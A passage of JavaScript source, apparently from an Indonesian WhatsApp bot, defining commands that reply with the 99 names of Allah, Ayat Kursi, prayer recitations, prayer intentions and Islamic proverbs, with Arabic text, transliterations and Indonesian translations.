arabic: "الْبَاعِثُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Membangkitkan",
translation_en: "The Raiser of the Dead"
},
{
index: 50,
latin: "As Syahiid",
arabic: "الشَّهِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Menyaksikan",
translation_en: "The Witness"
},
{
index: 51,
latin: "Al Haqq",
arabic: "الْحَقُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Benar",
translation_en: "The Truth, the Real"
},
{
index: 52,
latin: "Al Wakiil",
arabic: "الْوَكِيلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memelihara",
translation_en: "The Trustee, the Dependable"
},
{
index: 53,
latin: "Al Qawiyyu",
arabic: "الْقَوِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Kuat",
translation_en: "The Strong"
},
{
index: 54,
latin: "Al Matiin",
arabic: "الْمَتِينُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Kokoh",
translation_en: "The Firm, the Steadfast"
},
{
index: 55,
latin: "Al Waliyy",
arabic: "الْوَلِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Melindungi",
translation_en: "The Protecting Friend, Patron, and Helper"
},
{
index: 56,
latin: "Al Hamiid",
arabic: "الْحَمِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Terpuji",
translation_en: "The All Praiseworthy"
},
{
index: 57,
latin: "Al Mushii",
arabic: "الْمُحْصِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengkalkulasi",
translation_en: "The Accounter, the Numberer of All"
},
{
index: 58,
latin: "Al Mubdi’",
arabic: "الْمُبْدِئُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memulai",
translation_en: "The Producer, Originator, and Initiator of all"
},
{
index: 59,
latin: "Al Mu’iid",
arabic: "الْمُعِيدُ",
translation_id: "Yang Memiliki Mutlak sifat MahaMengembalikan Kehidupan",
translation_en: "The Reinstater Who Brings Back All"
},
{
index: 60,
latin: "Al Muhyii",
arabic: "الْمُحْيِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Menghidupkan",
translation_en: "The Giver of Life"
},
{
index: 61,
latin: "Al Mumiitu",
arabic: "اَلْمُمِيتُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mematikan",
translation_en: "The Bringer of Death, the Destroyer"
},
{
index: 62,
latin: "Al Hayyu",
arabic: "الْحَيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Hidup",
translation_en: "The Ever Living"
},
{
index: 63,
latin: "Al Qayyuum",
arabic: "الْقَيُّومُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mandiri",
translation_en: "The Self Subsisting Sustainer of All"
},
{
index: 64,
latin: "Al Waajid",
arabic: "الْوَاجِدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penemu",
translation_en: "The Perceiver, the Finder, the Unfailing"
},
{
index: 65,
latin: "Al Maajid",
arabic: "الْمَاجِدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
translation_en: "The Illustrious, the Magnificent"
},
{
index: 66,
latin: "Al Wahiid",
arabic: "الْواحِدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Tunggal",
translation_en: "The One, The Unique, Manifestation of Unity"
},
{
index: 67,
latin: "Al ‘Ahad",
arabic: "اَلاَحَدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Esa",
translation_en: "The One, the All Inclusive, the Indivisible"
},
{
index: 68,
latin: "As Shamad",
arabic: "الصَّمَدُ",
translation_id: "Yang Memiliki Mutlak sifat MahaDibutuhkan, Tempat Meminta",
translation_en: "The Self Sufficient, the Impregnable,the Eternally Besought of All, the Everlasting"
},
{
index: 69,
latin: "Al Qaadir",
arabic: "الْقَادِرُ",
translation_id: "Yang Memiliki Mutlak sifat MahaMenentukan, Maha Menyeimbangkan",
translation_en: "The All Able"
},
{
index: 70,
latin: "Al Muqtadir",
arabic: "الْمُقْتَدِرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Berkuasa",
translation_en: "The All Determiner, the Dominant"
},
{
index: 71,
latin: "Al Muqaddim",
arabic: "الْمُقَدِّمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mendahulukan",
translation_en: "The Expediter, He who brings forward"
},
{
index: 72,
latin: "Al Mu’akkhir",
arabic: "الْمُؤَخِّرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengakhirkan",
translation_en: "The Delayer, He who puts far away"
},
{
index: 73,
latin: "Al Awwal",
arabic: "الأوَّلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Awal",
translation_en: "The First"
},
{
index: 74,
latin: "Al Aakhir",
arabic: "الآخِرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Akhir",
translation_en: "The Last"
},
{
index: 75,
latin: "Az Zhaahir",
arabic: "الظَّاهِرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Nyata",
translation_en: "The Manifest; the All Victorious"
},
{
index: 76,
latin: "Al Baathin",
arabic: "الْبَاطِنُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Ghaib",
translation_en: "The Hidden; the All Encompassing"
},
{
index: 77,
latin: "Al Waali",
arabic: "الْوَالِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Memerintah",
translation_en: "The Patron"
},
{
index: 78,
latin: "Al Muta’aalii",
arabic: "الْمُتَعَالِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
translation_en: "The Self Exalted"
},
{
index: 79,
latin: "Al Barri",
arabic: "الْبَرُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penderma",
translation_en: "The Most Kind and Righteous"
},
{
index: 80,
latin: "At Tawwaab",
arabic: "التَّوَابُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penerima Tobat",
translation_en: "The Ever Returning, Ever Relenting"
},
{
index: 81,
latin: "Al Muntaqim",
arabic: "الْمُنْتَقِمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penuntut Balas",
translation_en: "The Avenger"
},
{
index: 82,
latin: "Al Afuww",
arabic: "العَفُوُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemaaf",
translation_en: "The Pardoner, the Effacer of Sins"
},
{
index: 83,
latin: "Ar Ra`uuf",
arabic: "الرَّؤُوفُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pengasih",
translation_en: "The Compassionate, the All Pitying"
},
{
index: 84,
latin: "Malikul Mulk",
arabic: "مَالِكُ الْمُلْكِ",
translation_id: "Yang Memiliki Mutlak sifatPenguasa Kerajaan (Semesta)",
translation_en: "The Owner of All Sovereignty"
},
{
index: 85,
latin: "Dzul JalaaliWal Ikraam",
arabic: "ذُوالْجَلاَلِوَالإكْرَامِ",
translation_id: "Yang Memiliki Mutlak sifat PemilikKebesaran dan Kemuliaan",
translation_en: "The Lord of Majesty and Generosity"
},
{
index: 86,
latin: "Al Muqsith",
arabic: "الْمُقْسِطُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
translation_en: "The Equitable, the Requiter"
},
{
index: 87,
latin: "Al Jamii’",
arabic: "الْجَامِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengumpulkan",
translation_en: "The Gatherer, the Unifier"
},
{
index: 88,
latin: "Al Ghaniyy",
arabic: "الْغَنِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Berkecukupan",
translation_en: "The All Rich, the Independent"
},
{
index: 89,
latin: "Al Mughnii",
arabic: "الْمُغْنِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Kekayaan",
translation_en: "The Enricher, the Emancipator"
},
{
index: 90,
latin: "Al Maani",
arabic: "اَلْمَانِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mencegah",
translation_en: "The Withholder, the Shielder, the Defender"
},
{
index: 91,
latin: "Ad Dhaar",
arabic: "الضَّارَّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Derita",
translation_en: "The Distressor, the Harmer"
},
{
index: 92,
latin: "An Nafii’",
arabic: "النَّافِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Manfaat",
translation_en: "The Propitious, the Benefactor"
},
{
index: 93,
latin: "An Nuur",
arabic: "النُّورُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Bercahaya(Menerangi, Memberi Cahaya)",
translation_en: "The Light"
},
{
index: 94,
latin: "Al Haadii",
arabic: "الْهَادِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Petunjuk",
translation_en: "The Guide"
},
{
index: 95,
latin: "Al Baadii",
arabic: "الْبَدِيعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pencipta",
translation_en: "Incomparable, the Originator"
},
{
index: 96,
latin: "Al Baaqii",
arabic: "اَلْبَاقِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Kekal",
translation_en: "The Ever Enduring and Immutable"
},
{
index: 97,
latin: "Al Waarits",
arabic: "الْوَارِثُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pewaris",
translation_en: "The Heir, the Inheritor of All"
},
{
index: 98,
latin: "Ar Rasyiid",
arabic: "الرَّشِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pandai",
translation_en: "The Guide, Infallible Teacher, and Knower"
},
{
index: 99,
latin: "As Shabuur",
arabic: "الصَّبُورُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Sabar",
translation_en: "The Patient"
}
]
let json = JSON.parse(JSON.stringify(asmaulhusna))
let data = json.map((v, i) => `${i + 1}. ${v.latin}\n${v.arabic}\n${v.translation_id}`).join('\n\n')
if (isNaN(args[0])) return qioreply (`contoh:\nasmaulhusna 1`)
if (args[0]) {
if (args[0] < 1 || args[0] > 99) throw `minimal 1 & maksimal 99!`
let { index, latin, arabic, translation_id, translation_en } = json.find(v => v.index == args[0].replace(/[^0-9]/g, ''))
return m.reply(`No. ${index}
${arabic}
${latin}
${translation_id}
${translation_en}
`.trim())
}
m.reply(`${contoh} + ${data} + ${anjuran}`)
}
break
//=================================================//
case 'ayatkursi': {
let caption = `
*「 Ayat Kursi 」*
اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”
Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
qioreply(caption)
}
break
//=================================================//
case 'bacaansholat': {
const bacaanshalat = {
"result": [
{
 "id": 1,
 "name": "Bacaan Iftitah",
 "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
 "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
 "terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
},
{
 "id": 2,
 "name": "Al Fatihah",
 "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَاالصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
 "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin",
 "terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
},
{
 "id": 3,
 "name": "Bacaan Ruku",
 "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
 "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
 "terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
},
{
 "id": 4,
 "name": "Bacaan Sujud",
 "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
 "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
 "terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
},
{
 "id": 5,
 "name": "Bacaan Duduk Diantara Dua Sujud",
 "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
 "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
 "terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
},
{
 "id": 6,
 "name": "Duduk Tasyahud Awal",
 "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
 "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
 "terjemahan": "Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
},
{
 "id": 7,
 "name": "Duduk Tasyahud Akhir",
 "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
 "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
 "terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
},
{
 "id": 8,
 "name": "Salam",
 "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
 "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
 "terjemahan": "Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian."
}
]
}
let bacaan = JSON.stringify(bacaanshalat)
let json = JSON.parse(bacaan)
let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
let contoh = `*「 Bacaan Shalat 」*\n\n`
m.reply(`${contoh} + ${data}`)
}
break
//=================================================//
case 'doaharian': {
let src = JSON.parse(fs.readFileSync('./lib/doaharian.json', 'utf-8'))
let caption = src.map((v, i) => {
return `
*${i + 1}.* ${v.title}

❃ Latin :
${v.latin}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
}).join('\n\n')
m.reply(`${caption}`)

}
break
//=================================================//
case 'niatsholat': {
if (!q) return m.reply(`Contoh Penggunaan :\nniatsholat Subuh`)
const niatsholat = [
{
index: 1,
solat: "subuh",
latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 2,
solat: "maghrib",
latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 3,
solat: "dzuhur",
latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 4,
solat: "isha",
latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 5,
solat: "ashar",
latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
}
]
let text = q.toLowerCase() || ''
let data = Object.values(niatsholat).find(v => v.solat == text)
if (!data) return m.reply(`${txt} Tidak Ditemukan\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
m.reply(`
_*Niat Sholat ${text}*_

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}

break
//=================================================//
case 'quotesislami': {
const islami = [
{
 "id": "1",
 "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
 "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
},
{
 "id": "2",
 "arabic": "مَنْ صَبَرَ ظَفِرَ",
 "arti": "Barang siapa bersabar, maka dia akan beruntung."
},
{
 "id": "3",
 "arabic": "مَنْ جَدَّ وَجَـدَ",
 "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
},
{
 "id": "4",
 "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
 "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
},
{
 "id": "5",
 "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
 "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
},
{
 "id": 6,
 "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
 "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
},
{
 "id": "7",
 "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
 "arti": "Kesabaran akan menolong segala pekerjaan."
},
{
 "id": "8",
 "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
 "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
},
{
 "id": "9",
 "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
 "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
},
{
 "id": "10",
 "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
 "arti": "Telur hari ini lebih baik daripada ayam esok hari."
},
{
 "id": "11",
 "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
 "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
},
{
 "id": "12",
 "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
 "arti": "Waktu itu lebih berharga daripada emas."
},
{
 "id": "13",
 "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
 "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
},
{
 "id": "14",
 "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
 "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
},
{
 "id": "15",
 "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
 "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
},
{
 "id": "16",
 "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
 "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
},{
 "id": "17",
 "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
 "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
},
{
 "id": "18",
 "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
 "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
},
{
 "id": "19",
 "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
 "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
},
{
 "id": "20",
 "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
 "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
},
{
 "id": "21",
 "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
 "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
},
{
 "id": "22",
 "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
 "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
},
{
 "id": "23",
 "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
 "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
},
{
 "id": "24",
 "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
 "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
},
{
 "id": "25",
